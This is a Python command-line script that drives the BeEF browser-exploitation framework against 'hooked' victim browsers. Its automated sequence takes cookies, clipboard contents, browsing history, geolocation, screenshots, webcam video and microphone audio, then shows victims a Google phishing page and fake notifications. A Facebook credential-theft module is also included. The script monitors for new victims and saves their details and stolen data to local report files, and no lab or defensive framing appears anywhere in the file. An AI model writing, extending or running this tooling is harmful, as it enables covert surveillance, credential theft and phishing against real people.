#!/usr/bin/env python3
"""
BeEF Browser Hijack Controller
Manages BeEF framework and executes exploits
"""
import socket
import subprocess
import requests
import argparse
import time
import sys
import json
import os
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()

# === CONFIGURATION ===
BEEF_HOST = "localhost"
BEEF_PORT = 3000
BEEF_USER = "beef"
BEEF_PASS = "123456"  

# === UTILITY FUNCTIONS ===
def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def check_beef_running():
    """Check if BeEF is running and accessible"""
    try:
        # Check if BeEF API is responding
        response = requests.get(
            f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks',
            timeout=2
        )
        # BeEF returns 401 if running but not authenticated, or 200 if token is cached
        return response.status_code in [200, 401]
    except:
        return False

def get_beef_token():
    """Get BeEF API authentication token"""
    try:
        # BeEF uses HTTP Basic Auth for API, not token-based
        # We'll use username:password in URL params
        response = requests.post(
            f'http://{BEEF_HOST}:{BEEF_PORT}/api/admin/login',
            json={
                'username': BEEF_USER,
                'password': BEEF_PASS
            },
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            # BeEF returns token on successful login
            if 'token' in data:
                return data['token']
            # Some versions might return success without token
            # In this case, we'll use Basic Auth
        
        # Fallback: try to get token from UI session
        token = get_api_token_from_ui()
        if token:
            return token
            
        # Last resort: return a placeholder to use Basic Auth
        return 'use_basic_auth'
        
    except Exception as e:
        console.print(f"[yellow]Token fetch failed: {e}, trying alternative methods...[/yellow]")
        # Try UI token extraction
        token = get_api_token_from_ui()
        if token:
            return token
        return 'use_basic_auth'

def get_api_token_from_ui():
    """Get token by scraping the UI page"""
    try:
        response = requests.get(
            f'http://{BEEF_HOST}:{BEEF_PORT}/ui/panel',
            timeout=2
        )
        
        if response.status_code == 200:
            content = response.text
            if 'beeftoken' in content.lower():
                import re
                patterns = [
                    r'token["\s:]+([a-f0-9]{32,})',
                    r'beeftoken["\s:]+([a-f0-9]{32,})',
                    r'["\']([a-f0-9]{32,})["\']'
                ]
                for pattern in patterns:
                    match = re.search(pattern, content, re.IGNORECASE)
                    if match:
                        return match.group(1)
    except:
        pass
    return None

# === BEEF MANAGEMENT ===
def start_beef():
    """Start BeEF framework"""
    console.print("\n[bold cyan]Starting BeEF Framework...[/bold cyan]\n")
    
    if check_beef_running():
        console.print("[yellow]✓ BeEF is already running![/yellow]")
        console.print(f"[blue]BeEF UI: http://{BEEF_HOST}:{BEEF_PORT}/ui/panel[/blue]")
        console.print(f"[blue]Credentials: {BEEF_USER} / {BEEF_PASS}[/blue]\n")
        return True
    
    console.print("[yellow]Starting BeEF (this may take 10-15 seconds)...[/yellow]")
    
    try:
        # Start BeEF process
        process = subprocess.Popen(
            ['beef-xss'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            start_new_session=True,
            text=True
        )
        
        # Wait for BeEF to start with better detection
        max_wait = 20
        for i in range(max_wait):
            time.sleep(1)
            if check_beef_running():
                console.print("\n[green]✓ BeEF started successfully![/green]")
                console.print(f"[blue]BeEF UI: http://{BEEF_HOST}:{BEEF_PORT}/ui/panel[/blue]")
                console.print(f"[blue]Credentials: {BEEF_USER} / {BEEF_PASS}[/blue]")
                console.print(f"[cyan]Process ID: {process.pid}[/cyan]\n")
                
                # Give it 2 more seconds to fully initialize
                console.print("[yellow]Waiting for BeEF to fully initialize...[/yellow]")
                time.sleep(2)
                
                return True
            
            if i % 3 == 0 and i > 0:
                console.print(f"[yellow]Still waiting... ({i+1}/{max_wait})[/yellow]")
        
        console.print("\n[red]✗ BeEF did not start properly![/red]")
        console.print("[yellow]Try running manually: beef-xss[/yellow]")
        console.print("[yellow]Or check if another instance is already running on port 3000[/yellow]\n")
        return False
        
    except FileNotFoundError:
        console.print("\n[red]✗ BeEF not found! Install it first:[/red]")
        console.print("[cyan]sudo apt install beef-xss[/cyan]\n")
        return False
    except Exception as e:
        console.print(f"\n[red]✗ Error starting BeEF: {e}[/red]\n")
        return False

def get_hooked_browsers():
    """Get list of all hooked browsers using token authentication"""
    try:
        token = get_beef_token()
        if not token:
            console.print(f"[red]Failed to get API token[/red]")
            return []
        
        # Use proper authentication
        if token == 'use_basic_auth':
            response = requests.get(
                f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks',
                auth=(BEEF_USER, BEEF_PASS),
                timeout=5
            )
        else:
            response = requests.get(
                f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks',
                params={'token': token},
                timeout=5
            )
        
        if response.status_code == 200:
            data = response.json()
            hooked = data.get('hooked-browsers', {})
            online = hooked.get('online', {})
            
            if isinstance(online, dict):
                return list(online.values())
            return online if isinstance(online, list) else []
        
        elif response.status_code == 401:
            console.print(f"[red]Authentication failed! Check username/password[/red]")
            console.print(f"[yellow]Current: {BEEF_USER} / {BEEF_PASS}[/yellow]")
            console.print(f"[yellow]Edit hijack.py to change credentials[/yellow]")
            
    except Exception as e:
        console.print(f"[red]Error getting hooks: {e}[/red]")
    
    return []

def display_status():
    """Display BeEF status"""
    if check_beef_running():
        console.print("\n[green]✓ BeEF Status: RUNNING[/green]")
        console.print(f"[blue]BeEF UI: http://{BEEF_HOST}:{BEEF_PORT}/ui/panel[/blue]")
        console.print(f"[blue]Credentials: {BEEF_USER} / {BEEF_PASS}[/blue]")
        
        hooks = get_hooked_browsers()
        console.print(f"[cyan]Hooked Browsers: {len(hooks)}[/cyan]\n")
        
        if len(hooks) > 0:
            console.print("[green]Active victims found! Use --list to see details[/green]\n")
    else:
        console.print("\n[red]✗ BeEF Status: NOT RUNNING[/red]")
        console.print("[yellow]Start it with: python3 hijack.py --start[/yellow]\n")

def list_hooked_browsers():
    """Display table of hooked browsers"""
    hooks = get_hooked_browsers()
    
    if not hooks:
        console.print("\n[yellow]No hooked browsers found[/yellow]")
        console.print("[cyan]Waiting for victims to open the link...[/cyan]\n")
        return
    
    table = Table(title=f"\n🎯 Hooked Browsers ({len(hooks)})", show_header=True)
    table.add_column("Session ID", style="cyan", no_wrap=True)
    table.add_column("IP Address", style="green")
    table.add_column("Browser", style="yellow")
    table.add_column("OS", style="magenta")
    table.add_column("Status", style="green")
    
    for hook in hooks:
        session = str(hook.get('session', 'Unknown'))
        ip = hook.get('ip', 'Unknown')
        browser = hook.get('name', 'Unknown')
        
        os_info = hook.get('os', 'Unknown')
        if isinstance(os_info, dict):
            os_name = os_info.get('name', 'Unknown')
        else:
            os_name = str(os_info)
        
        status = "🟢 Online"
        
        table.add_row(session, ip, browser, os_name, status)
    
    console.print(table)
    console.print()

def monitor_hooks():
    """Monitor for new hooked browsers in real-time"""
    console.print("\n[green]🔍 Monitoring for hooked browsers...[/green]")
    console.print("[yellow]Press Ctrl+C to stop[/yellow]\n")
    
    seen_sessions = set()
    error_count = 0
    
    try:
        while True:
            hooks = get_hooked_browsers()
            
            if hooks or error_count > 10:
                error_count = 0
            
            for hook in hooks:
                session = hook.get('session')
                if session and session not in seen_sessions:
                    seen_sessions.add(session)
                    
                    os_info = hook.get('os', {})
                    if isinstance(os_info, dict):
                        os_name = os_info.get('name', 'Unknown')
                    else:
                        os_name = str(os_info)
                    
                    panel_content = f"""
[green]Session:[/green] [cyan]{session}[/cyan]
[green]IP:[/green] [cyan]{hook.get('ip', 'Unknown')}[/cyan]
[green]Browser:[/green] [cyan]{hook.get('name', 'Unknown')}[/cyan]
[green]OS:[/green] [cyan]{os_name}[/cyan]
                    """
                    
                    console.print(Panel(
                        panel_content.strip(),
                        title="🎯 NEW VICTIM HOOKED",
                        border_style="green"
                    ))
                    console.print()
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        console.print("\n[yellow]Monitoring stopped[/yellow]\n")

def run_all_exploits(session_id, save_results=False):
    """Execute all exploits against a hooked browser"""
    console.print(f"\n[bold cyan]🎯 Running ALL exploits on session: {session_id}[/bold cyan]\n")
    
    # Sequence of exploits - ordered for maximum data collection
    exploits_list = [
        # Phase 1: Information Gathering (silent, no user interaction)
        ('fingerprint', None, 2),           # Get browser fingerprint
        ('geolocation', None, 2),           # Get location
        ('cookies', None, 2),               # Get cookies
        ('detect_social', None, 3),         # Detect logged-in social networks
        ('clipboard', None, 2),             # Get clipboard content
        ('history', None, 3),               # Get browsing history
        
        # Phase 2: Media Capture (requires permissions but camera/mic already granted)
        ('screenshot', None, 3),            # Take screenshot
        ('webcam_record', None, 12),        # Record 10 seconds of video (wait 12s total)
        ('record_audio_start', None, 1),    # Start audio recording
        
        # Phase 3: Wait for audio recording
        ('_wait', 10, 10),                  # Wait 10 seconds for audio
        ('record_audio_stop', None, 2),     # Stop audio recording
        
        # Phase 4: Social Engineering (visible to user)
        ('google_phishing', None, 5),       # Google phishing form (for prize claim)
        ('fake_notification', None, 3),     # Fake browser notification
        
        # Phase 5: Optional - Credential theft (if google phishing fails)
        # ('pretty_theft', None, 3),        # Facebook login phishing (uncomment if needed)
        
        # Phase 6: Final actions
        # ('alert', 'Congratulations! Check your email for prize details.', 2),
        # ('redirect', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', 0),  # Rickroll at the end
    ]
    
    results = []
    for item in exploits_list:
        if len(item) == 3:
            exploit_name, param, wait_time = item
        else:
            exploit_name, param = item
            wait_time = 2
        
        # Special case: just wait
        if exploit_name == '_wait':
            console.print(f"[cyan]⏳ Waiting {param} seconds for previous commands to complete...[/cyan]")
            time.sleep(param)
            continue
        
        console.print(f"[yellow]→ Running {exploit_name}...[/yellow]")
        success = run_exploit(exploit_name, session_id, param)
        results.append((exploit_name, success))
        
        # Wait for command to execute before next one
        if wait_time > 0:
            console.print(f"[cyan]   Waiting {wait_time}s for execution...[/cyan]")
            time.sleep(wait_time)
    
    console.print("\n[bold cyan]═══════════════════════════════════════[/bold cyan]")
    console.print("[bold cyan]         EXPLOIT SUMMARY[/bold cyan]")
    console.print("[bold cyan]═══════════════════════════════════════[/bold cyan]\n")
    
    table = Table(show_header=True)
    table.add_column("Exploit", style="cyan", width=25)
    table.add_column("Status", style="green", width=15)
    
    for exploit_name, success in results:
        status = "✓ Success" if success else "✗ Failed"
        style = "green" if success else "red"
        table.add_row(exploit_name.upper(), f"[{style}]{status}[/{style}]")
    
    console.print(table)
    console.print(f"\n[cyan]Check BeEF UI for detailed results: http://{BEEF_HOST}:{BEEF_PORT}/ui/panel[/cyan]\n")
    
    if save_results:
        console.print("\n[yellow]⏳ Waiting 15 seconds for all commands to complete...[/yellow]")
        time.sleep(15)  # Extra wait for all data to be collected
        console.print("[yellow]Fetching and saving results...[/yellow]")
        save_exploit_results(session_id)

def save_exploit_results(session_id):
    """Fetch all command results from BeEF and save to local directory"""
    try:
        token = get_beef_token()
        if not token:
            console.print("[red]Failed to get API token for saving results[/red]")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_dir = f"results_{session_id[:8]}_{timestamp}"
        os.makedirs(results_dir, exist_ok=True)
        
        # Use proper authentication
        if token == 'use_basic_auth':
            response = requests.get(
                f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks/{session_id}',
                auth=(BEEF_USER, BEEF_PASS),
                timeout=10
            )
        else:
            response = requests.get(
                f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks/{session_id}',
                params={'token': token},
                timeout=10
            )
        
        if response.status_code != 200:
            console.print(f"[red]Failed to fetch results (Status: {response.status_code})[/red]")
            return
        
        hook_data = response.json()
        
        victim_info = {
            'session_id': session_id,
            'browser': hook_data.get('browser.name.friendly', 'Unknown'),
            'browser_version': hook_data.get('browser.version', 'Unknown'),
            'os': hook_data.get('host.os.name', 'Unknown'),
            'ip': hook_data.get('network.ipaddress', 'Unknown'),
            'location': f"{hook_data.get('location.city', 'Unknown')}, {hook_data.get('location.country', 'Unknown')}",
            'timestamp': timestamp
        }
        
        with open(f"{results_dir}/victim_info.json", 'w') as f:
            json.dump(victim_info, f, indent=2)
        
        # Get command logs with proper auth
        if token == 'use_basic_auth':
            logs_response = requests.get(
                f'http://{BEEF_HOST}:{BEEF_PORT}/api/logs',
                auth=(BEEF_USER, BEEF_PASS),
                timeout=10
            )
        else:
            logs_response = requests.get(
                f'http://{BEEF_HOST}:{BEEF_PORT}/api/logs',
                params={'token': token},
                timeout=10
            )
        
        saved_count = 0
        
        try:
            # Try to get command results from API endpoint
            if token == 'use_basic_auth':
                ui_response = requests.get(
                    f'http://{BEEF_HOST}:{BEEF_PORT}/api/modules/{session_id}',
                    auth=(BEEF_USER, BEEF_PASS),
                    timeout=10
                )
            else:
                ui_response = requests.get(
                    f'http://{BEEF_HOST}:{BEEF_PORT}/api/modules/{session_id}',
                    params={'token': token},
                    timeout=10
                )
            
            if ui_response.status_code == 200:
                commands_data = ui_response.json()
                
                with open(f"{results_dir}/all_commands.json", 'w') as f:
                    json.dump(commands_data, f, indent=2)
                
                if isinstance(commands_data, dict) and 'commands' in commands_data:
                    for cmd in commands_data['commands']:
                        cmd_id = cmd.get('id', 'unknown')
                        cmd_label = cmd.get('label', 'unknown').replace(' ', '_').replace('/', '_').lower()
                        cmd_data = cmd.get('data', {})
                        
                        if cmd_data:  # Only save if there's actual data
                            filename = f"{results_dir}/{cmd_label}_{cmd_id}.json"
                            with open(filename, 'w') as f:
                                json.dump(cmd, f, indent=2)
                            saved_count += 1
                            
                            if 'result' in cmd_data or 'data' in cmd_data:
                                txt_file = f"{results_dir}/{cmd_label}_{cmd_id}.txt"
                                with open(txt_file, 'w') as f:
                                    f.write(f"Command: {cmd.get('label', 'Unknown')}\n")
                                    f.write(f"Status: {cmd.get('status_text', 'Unknown')}\n")
                                    f.write(f"Executed: {cmd.get('creationdate', 'Unknown')}\n\n")
                                    f.write("Results:\n")
                                    f.write(json.dumps(cmd_data, indent=2))
        except Exception as e:
            console.print(f"[yellow]Note: {e}[/yellow]")
        
        summary = f"""
BeEF Exploitation Report
========================
Session ID: {session_id}
Timestamp: {timestamp}

Victim Information:
- Browser: {victim_info['browser']} {victim_info['browser_version']}
- OS: {victim_info['os']}
- IP: {victim_info['ip']}
- Location: {victim_info['location']}

Commands Executed: {saved_count} with results

Results saved in: {results_dir}/

Note: Check the BeEF UI for real-time results at:
http://{BEEF_HOST}:{BEEF_PORT}/ui/panel

Click on the hooked browser → Commands tab to see all results.
        """
        
        with open(f"{results_dir}/REPORT.txt", 'w') as f:
            f.write(summary.strip())
        
        console.print(f"\n[green]✓ Results saved to: {results_dir}/[/green]")
        console.print(f"[cyan]Files saved:[/cyan]")
        console.print(f"  - victim_info.json (victim details)")
        console.print(f"  - all_commands.json (raw command data)")
        console.print(f"  - {saved_count} individual command results")
        console.print(f"  - REPORT.txt (summary)")
        
        if saved_count == 0:
            console.print(f"\n[yellow]⚠ No command results captured yet.[/yellow]")
            console.print(f"[yellow]Commands may still be executing. Check BeEF UI or run --save again in 30 seconds.[/yellow]")
        
    except Exception as e:
        console.print(f"[red]Error saving results: {e}[/red]")

# === EXPLOIT EXECUTION ===
def run_exploit(exploit_name, session_id, extra_param=None):
    """Execute exploit against hooked browser"""
    
    # Define available exploits with their module IDs
    exploits = {
        'alert': {
            'module_id': 285,  # Create Alert Dialog
            'params': {'text': extra_param or 'You have been hacked!'}
        },
        'alert2': {
            'module_id': 40,  # Alternative Alert Dialog
            'params': {'question': extra_param or 'Your system has been compromised!'}
        },
        'js': {
            'module_id': 80,  # Raw JavaScript
            'params': {'cmd': extra_param or 'alert("Your PC has been hacked!")'}  # Parameter is 'cmd' not 'js'
        },
        'redirect': {
            'module_id': 260,  # Redirect Browser (Rickroll)
            'params': {'redirect_url': extra_param or 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'}
        },
        'geolocation': {
            'module_id': 104,  # Get Geolocation (API)
            'params': {}
        },
        'cookies': {
            'module_id': 277,  # Get Cookie
            'params': {}
        },
        'screenshot': {
            'module_id': 246,  # Screenshot
            'params': {}
        },
        'fingerprint': {
            'module_id': 289,  # Fingerprint Browser
            'params': {}
        },
        'history': {
            'module_id': 288,  # Get Visited Domains
            'params': {}
        },
        'webcam': {
            'module_id': 252,  # Webcam HTML5 (request permission)
            'params': {}
        },
        'webcam_record': {
            'module_id': 214,  # Webcam with recording capability
            'params': {'duration': '10'}  # Record for 10 seconds
        },
        'clipboard': {
            'module_id': 127,  # Get Clipboard
            'params': {}
        },
        'record_audio_start': {
            'module_id': 26,  # Start Recording Audio
            'params': {}
        },
        'record_audio_stop': {
            'module_id': 25,  # Stop Recording Audio
            'params': {}
        },
        'pretty_theft': {
            'module_id': 8,  # Facebook type UI for login (credential theft)
            'params': {}
        },
        'google_phishing': {
            'module_id': 11,  # Google Phishing
            'params': {}
        },
        'fake_notification': {
            'module_id': 17,  # Fake Notification Bar (Chrome)
            'params': {}
        },
        'fake_notification2': {
            'module_id': 18,  # Alternative Fake Notification
            'params': {}
        },
        'detect_social': {
            'module_id': 64,  # Detect Social Networks
            'params': {}
        }
    }
    
    if exploit_name not in exploits:
        console.print(f"[red]Unknown exploit: {exploit_name}[/red]")
        console.print(f"[yellow]Available: {', '.join(exploits.keys())}[/yellow]")
        return False
    
    exploit = exploits[exploit_name]
    
    # Get API token
    token = get_beef_token()
    if not token:
        console.print(f"[red]Failed to get API token[/red]")
        return False
    
    try:
        console.print(f"\n[yellow]Executing {exploit_name}...[/yellow]")
        
        # BeEF API expects this format for command execution
        # Use the REST API endpoint, not the UI endpoint
        api_url = f'http://{BEEF_HOST}:{BEEF_PORT}/api/modules/{session_id}/{exploit["module_id"]}'
        
        # Prepare the payload in the format BeEF expects
        payload = exploit['params']
        
        # Try with token in URL (most compatible method)
        response = requests.post(
            api_url,
            params={'token': token} if token != 'use_basic_auth' else {},
            auth=(BEEF_USER, BEEF_PASS) if token == 'use_basic_auth' else None,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        if response.status_code == 200:
            console.print(f"[green]✓ {exploit_name.upper()} executed successfully![/green]")
            console.print(f"[cyan]Check BeEF UI for results: http://{BEEF_HOST}:{BEEF_PORT}/ui/panel[/cyan]\n")
            return True
        else:
            console.print(f"[red]✗ Failed (Status: {response.status_code})[/red]")
            console.print(f"[yellow]Response: {response.text[:500]}[/yellow]")
            
            # If API method failed, try alternative method using the UI endpoint
            console.print(f"[yellow]Trying alternative method...[/yellow]")
            
            # Some BeEF versions require using the web UI endpoint
            ui_url = f'http://{BEEF_HOST}:{BEEF_PORT}/api/modules/{session_id}/{exploit["module_id"]}'
            
            # Prepare form data (some modules expect form-encoded data)
            form_data = {}
            for key, value in exploit['params'].items():
                form_data[key] = str(value)
            
            response2 = requests.post(
                ui_url,
                params={'token': token} if token != 'use_basic_auth' else {},
                auth=(BEEF_USER, BEEF_PASS),
                data=form_data,
                timeout=10
            )
            
            if response2.status_code == 200:
                console.print(f"[green]✓ {exploit_name.upper()} executed successfully (alternative method)![/green]")
                console.print(f"[cyan]Check BeEF UI for results: http://{BEEF_HOST}:{BEEF_PORT}/ui/panel[/cyan]\n")
                return True
            else:
                console.print(f"[red]✗ Alternative method also failed (Status: {response2.status_code})[/red]")
                console.print(f"[yellow]Make sure the session ID is correct and the browser is still hooked[/yellow]\n")
                return False
            
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]\n")
        return False

# === MAIN ===
def main():
    parser = argparse.ArgumentParser(
        description='BeEF Browser Hijack Controller',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 hijack.py --start                    # Start BeEF
  python3 hijack.py --status                   # Check status
  python3 hijack.py --monitor                  # Monitor for victims
  python3 hijack.py --list                     # List hooked browsers
  python3 hijack.py --exploit alert --session abc123
  python3 hijack.py --exploit redirect --session abc123 --url https://example.com
  python3 hijack.py --exploit all --session abc123     # Run ALL exploits
  python3 hijack.py --exploit all --session abc123 --save  # Run all + save results
        """
    )
    
    parser.add_argument('--start', action='store_true',
                       help='Start BeEF framework')
    parser.add_argument('--status', action='store_true',
                       help='Check BeEF status')
    parser.add_argument('--monitor', action='store_true',
                       help='Monitor for new hooked browsers')
    parser.add_argument('--list', action='store_true',
                       help='List all hooked browsers')
    parser.add_argument('--exploit', 
                       choices=['alert', 'alert2', 'js', 'redirect', 'geolocation', 'cookies',
                               'screenshot', 'fingerprint', 'history', 'webcam', 'webcam_record',
                               'clipboard', 'record_audio_start', 'record_audio_stop', 
                               'pretty_theft', 'google_phishing', 'fake_notification', 
                               'fake_notification2', 'detect_social', 'all'],
                       help='Execute exploit (use "all" to run all exploits)')
    parser.add_argument('--session', help='Target session ID')
    parser.add_argument('--code', help='JavaScript code (for js exploit)')
    parser.add_argument('--url', help='URL (for redirect exploit)')
    parser.add_argument('--save', action='store_true',
                       help='Save exploit results to local directory')
    
    args = parser.parse_args()
    
    # Display banner
    banner = """
╔═══════════════════════════════════════╗
║   BeEF Browser Hijack Controller     ║
║        Ngrok Method - v2.0           ║
╚═══════════════════════════════════════╝
    """
    console.print(f"[bold cyan]{banner}[/bold cyan]")
    
    # Execute commands
    if args.start:
        start_beef()
    elif args.status:
        display_status()
    elif args.monitor:
        if not check_beef_running():
            console.print("[red]BeEF is not running! Start it first.[/red]")
            sys.exit(1)
        monitor_hooks()
    elif args.list:
        if not check_beef_running():
            console.print("[red]BeEF is not running! Start it first.[/red]")
            sys.exit(1)
        list_hooked_browsers()
    elif args.exploit and args.session:
        if not check_beef_running():
            console.print("[red]BeEF is not running! Start it first.[/red]")
            sys.exit(1)
        
        if args.exploit == 'all':
            run_all_exploits(args.session, save_results=args.save)
        else:
            extra = args.code or args.url
            run_exploit(args.exploit, args.session, extra)
            if args.save:
                save_exploit_results(args.session)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()